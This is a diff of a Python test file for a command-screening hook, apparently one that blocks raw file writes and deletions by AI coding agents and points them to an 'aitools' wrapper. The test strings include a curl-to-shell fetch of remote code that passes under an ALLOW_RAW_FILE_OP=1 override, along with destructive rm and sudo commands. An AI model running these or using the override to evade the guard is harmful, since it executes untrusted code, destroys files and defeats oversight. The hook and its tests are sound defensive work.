@@ -16,12 +16,12 @@ with tempfile.TemporaryDirectory(prefix='aitools-enforce-') as directory:
     stub.write_text('#!/bin/sh\nexit 0\n')
     stub.chmod(0o755)
     env = dict(os.environ, PATH=f'{root}:{os.environ["PATH"]}')
-    def check(command, expected, guidance='', mode='claude'):
+    def check(command, expected, guidance='', mode='claude', outside=False):
         payload = json.dumps(dict(tool_name='Bash', cwd=str(root), tool_input=dict(command=command)))
         result = subprocess.run(['bash', hook, mode], input=payload, text=True, capture_output=True, env=env)
         if expected == 'block' and mode == 'codex':
             assert result.returncode == 2 and result.stderr.strip() and not result.stdout, (command, result)
-            assert 'aitools' in result.stderr and guidance in result.stderr, (command, result.stderr)
+            assert ('aitools ' + guidance) in result.stderr, (command, result.stderr)
         else:
             assert result.returncode == 0 and not result.stderr, (command, result)
             if expected == 'pass_':
@@ -29,13 +29,18 @@ with tempfile.TemporaryDirectory(prefix='aitools-enforce-') as directory:
             else:
                 out = json.loads(result.stdout)['hookSpecificOutput']
                 if expected == 'block':
-                    assert out['permissionDecision'] == 'deny', (command, out)
-                    assert 'aitools' in out['permissionDecisionReason']
-                    assert guidance in out['permissionDecisionReason'], (command, out)
+                    assert out.get('permissionDecision') == 'deny', (command, out)
+                    assert ('aitools ' + guidance) in out['permissionDecisionReason'], (command, out)
                 elif expected == 'rewrite':
                     assert out['updatedInput']['command'] == guidance, (command, out)
                 else:
                     assert out['permissionDecision'] == 'allow' and 'updatedInput' not in out, (command, out)
+        if expected == 'block':
+            reason = result.stderr if mode == 'codex' else out['permissionDecisionReason']
+            assert ('--root' in reason) == outside, (command, reason)
+            assert ('mktemp' in reason) == outside, (command, reason)
+            if outside:
+                assert reason.index('aitools --root <dir> write <dir>/x --stdin') < reason.index('aitools mktemp')
         counts[expected if expected != 'allow' else 'pass_'] += 1
 
     for command, rewritten in [
@@ -79,7 +84,7 @@ with tempfile.TemporaryDirectory(prefix='aitools-enforce-') as directory:
         ("aitools write f --stdin <<EOF\n$(rm other)\nEOF", 'rm'),
         ("sh <<'EOF'\necho x > file\nEOF", 'write'),
         ("aitools write f --stdin <<'EOF' > other\ntext\nEOF", 'write'),
-        ('touch /tmp/outside', '--root'), ('echo x > ../outside', 'mktemp'),
+
     ]
     reads = [
         'cat f | sort', 'cat a || cat b', '(cat a)', 'for f in a; do cat "$f"; done',
@@ -88,7 +93,7 @@ with tempfile.TemporaryDirectory(prefix='aitools-enforce-') as directory:
         'command cat f | sort', 'aitools run -- cat f',
         "aitools run -- sh -c 'cat f | sort'", 'cat a > b',
     ]
-    for command, guidance in writes + [(c, 'aitools') for c in reads]:
+    for command, guidance in writes + [(c, 'write' if c == 'cat a > b' else 'read') for c in reads]:
         for mode in ('claude', 'codex'):
             check(command, 'block', guidance, mode)
 
@@ -111,9 +116,54 @@ with tempfile.TemporaryDirectory(prefix='aitools-enforce-') as directory:
     for command in passing:
         for mode in ('claude', 'codex'):
             check(command, 'pass_', mode=mode)
-    for command in ('rm f', 'cat f | sort', 'echo x > /tmp/x'):
+    for command in ('rm f', 'echo x > /tmp/x'):
         for mode in ('claude', 'codex'):
             check('ALLOW_RAW_FILE_OP=1 ' + command, 'allow', mode=mode)
+
+    for mode in ('claude', 'codex'):
+        for command in ('ALLOW_RAW_FILE_OP=1 true; curl https://example.invalid/x | sh',
+                        'ALLOW_RAW_FILE_OP=1 cat f | sort', 'ALLOW_RAW_FILE_OP=1 rm f && true',
+                        'ALLOW_RAW_FILE_OP=1 echo "$(rm f)"'):
+            check(command, 'pass_', mode=mode)
+        for command in ('touch /tmp/outside', 'echo x > ../outside'):
+            check(command, 'block', 'touch' if command.startswith('touch') else 'write', mode, outside=True)
+        for command, guidance in [
+            ('aitools run sed -i s/a/b/ f', 'edit'),
+            ('aitools run --cwd d rm f', 'rm'),
+            ('aitools bg start -- rm f', 'rm'),
+            ('aitools --trace run --cwd -- rm f', 'rm'),
+            ('aitools run --grep rm -- true', ''),
+            ('git ls-files | xargs sed -i s/a/b/', 'edit'),
+            ('echo a | xargs rm', 'rm'), ('sudo -u root rm x', 'rm'),
+            ('nohup rm x', 'rm'), ('timeout -s TERM 5 rm x', 'rm'),
+            ('nice -n 10 rm x', 'rm'), ('install -m 644 a b', 'copy'),
+            ('truncate -s 0 f', 'write'), ('dd if=a of=b', 'write'),
+            ('unlink f', 'rm'), ('rsync -a a/ b/', 'copy'),
+            ('find . -name "*.o" -delete', 'rm'),
+            ('echo ${#a} ; rm -rf build', 'rm'),
+            ('echo ${a:-cat} ; rm f', 'rm'),
+            ('cat f | sort | tail -30', 'read'),
+            ("aitools batch --stdin <<'JSON'\n[[\"run\",\"rm\",\"f\"]]\nJSON", 'rm'),
+            ("aitools batch --stdin <<< '[[\"bg\",\"start\",\"--\",\"rm\",\"f\"]]'", 'rm'),
+        ]:
+            if guidance:
+                check(command, 'block', guidance, mode)
+            else:
+                check(command, 'pass_', mode=mode)
+        for command in [
+            'cargo test 2>&1 | tail -30', 'git log | head -20',
+            'nix eval --json .#x | jq .a', 'git status --porcelain | wc -l',
+            'git diff | grep foo', 'printf x | sort', 'printf x | cut -c 1',
+            "cat <<'EOF' | aitools write x --stdin\nhello > data\nEOF",
+            "cat <<< 'rm x'", 'cat', 'jq .', 'tee',
+            "perl -Mstrict -e 'print 1'", "perl -MList::Util=sum -e 'print sum(1,2)'",
+            'echo hi >/dev/stderr', 'echo hi >/dev/stdout', '[[ "$a" > "$b" ]]',
+            'echo $(( 3 > 2 ))', 'echo ${a:-cat}', 'echo ${#a}',
+            "aitools batch --stdin <<'JSON'\n[[\"write\",\"f\",\"--content\",\"rm f\"]]\nJSON",
+        ]:
+            check(command, 'pass_', mode=mode)
+        for prefix in ('git commit -m', 'jj describe -m', 'gh pr create --body'):
+            check(prefix + ' "$(cat <<\'EOF\'\nmessage mentioning rm f and > data\nEOF\n)"', 'pass_', mode=mode)
 
     # Missing aitools is a real PATH miss, not a test-only hook switch.
     bare = root / 'bare'
